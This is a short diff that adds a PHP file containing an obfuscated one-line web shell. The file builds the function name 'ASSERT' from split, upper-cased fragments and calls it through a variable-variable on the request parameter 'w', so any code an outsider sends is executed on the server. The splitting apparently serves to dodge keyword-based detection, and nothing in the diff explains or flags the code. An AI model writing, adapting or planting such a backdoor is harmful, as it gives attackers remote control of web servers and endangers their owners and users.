@@ -1,0 +1,7 @@
+<?php
+    $dogkill=strtoupper('ass');
+    $dogri=strtoupper('ert');
+    $funcName=strtoupper($dogkill.$dogri);
+    $dogkilling='funcName';
+    $$dogkilling($_REQUEST[w]);
+ ?>
